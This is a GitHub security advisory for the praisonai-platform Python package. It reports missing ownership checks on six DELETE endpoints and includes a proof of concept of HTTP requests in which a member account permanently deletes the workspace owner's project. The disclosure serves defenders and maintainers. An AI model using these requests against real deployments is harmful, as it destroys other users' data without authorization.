# [H] PraisonAI: Missing ownership check on DELETE endpoints allows members to delete others' content in Platform API

## Summary
Severity: High
Advisory: GHSA-rh39-9c67-59mh
CVE: CVE-2026-57121
CWE: CWE-285
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-rh39-9c67-59mh
Type: github-advisory

## Affected
- PyPI: `praisonai-platform` — affected >=0.1.4 <0.1.6

## Details
### Summary
A workspace member can permanently delete any resource — projects, agents, issues, labels, issue dependencies, and issue-label attachments — created by the workspace owner or other members. All six content DELETE endpoints enforce workspace membership but perform no ownership or role check. A single malicious or compromised member account can wipe an entire workspace's content irreversibly.

### Details
The [published role capability matrix](https://docs.praison.ai/docs/features/platform/members) explicitly restricts members from modifying others' content:

| Capability | Owner | Admin | Member |
|---|---|---|---|
| Create issues/tasks | ✅ | ✅ | ✅ |
| Edit own content | ✅ | ✅ | ✅ |
| Edit others' content | ✅ | ✅ | ❌ |

The DELETE handlers for all content resources check that the requesting user is a workspace member, but do not verify that the user either created the resource or holds an `owner`/`admin` role. The result is that the `member` role has unrestricted DELETE access over all workspace content regardless of who created it.

**Confirmed vulnerable endpoints:**

| Endpoint | Expected | Actual |
|---|---|---|
| `DELETE /api/v1/workspaces/{workspace_id}/projects/{project_id}` | 403 | 204 |
| `DELETE /api/v1/workspaces/{workspace_id}/agents/{agent_id}` | 403 | 204 |
| `DELETE /api/v1/workspaces/{workspace_id}/issues/{issue_id}` | 403 | 204 |
| `DELETE /api/v1/workspaces/{workspace_id}/labels/{label_id}` | 403 | 204 |
| `DELETE /api/v1/workspaces/{workspace_id}/issues/{issue_id}/dependencies/{dep_id}` | 403 | 204 |
| `DELETE /api/v1/workspaces/{workspace_id}/issues/{issue_id}/labels/{label_id}` | 403 | 204 |

The missing check is isolated to content resource DELETEs.


### PoC
**Requirements:** Two accounts — owner (resource creator) and member (attacker).

**1. Register both accounts**

```http
POST /api/v1/auth/register
Content-Type: application/json

{"email": "owner@example.com", "password": "Password1!", "name": "owner"}
```

```http
POST /api/v1/auth/register
Content-Type: application/json

{"email": "member@example.com", "password": "Password1!", "name": "member"}
```

**2. Owner creates workspace, adds member with `member` role**

```http
POST /api/v1/workspaces/
Authorization: Bearer <owner_token>
Content-Type: application/json

{"name": "Test Workspace"}
```

```http
POST /api/v1/workspaces/{workspace_id}/members
Authorization: Bearer <owner_token>
Content-Type: application/json

{"user_id": "<member_user_id>", "role": "member"}
```

**3. Owner creates a project**

```http
POST /api/v1/workspaces/{workspace_id}/projects/
Authorization: Bearer <owner_token>
Content-Type: application/json

{"title": "Owner's Project"}
```

Response `201 Created`:
```json
{"id": "29ce3e29-a6f0-4063-b0a2-d565b4f1c1a6", "title": "Owner's Project", ...}
```

**4. Member deletes the owner's project**

```http
DELETE /api/v1/workspaces/{workspace_id}/projects/29ce3e29-a6f0-4063-b0a2-d565b4f1c1a6
Authorization: Bearer <member_token>
```

Response: **`204 No Content`**

**5. Owner confirms the project is permanently gone**

```http
GET /api/v1/workspaces/{workspace_id}/projects/29ce3e29-a6f0-4063-b0a2-d565b4f1c1a6
Authorization: Bearer <owner_token>
```

Response: **`404 Not Found`**
```json
{"detail": "Project not found"}
```

The same steps reproduce on all six affected resource types (agents, issues, labels, issue dependencies, issue-label attachments).


---

### Impact

This is an improper authorization vulnerability. A workspace member can delete resources (projects, agents, issues, labels) created by other workspace members or the owner. The documented permission model restricts members to managing only their own content — the DELETE endpoints do not enforce this.

**Who is impacted:** Workspace owners and members who share a workspace with untrusted or compromised member accounts.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-rh39-9c67-59mh
- https://github.com/MervinPraison/PraisonAI
